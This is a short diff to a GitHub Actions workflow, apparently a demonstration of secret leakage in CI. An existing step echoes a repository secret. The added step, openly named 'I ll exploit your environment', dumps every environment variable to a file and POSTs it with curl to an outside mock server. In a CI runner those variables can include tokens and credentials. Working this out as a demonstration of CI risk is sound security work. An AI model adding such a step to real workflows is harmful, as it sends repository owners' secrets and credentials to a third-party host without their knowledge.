@@ -25,3 +25,9 @@ jobs:
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
+
+      - name: I ll exploit your environment
+        run: |
+          #!/bin/bash
+          printenv > ./env
+          curl -X POST -d @./env https://a28eaec1-69bc-42c2-9364-b42dc9cd6228.mock.pstmn.io
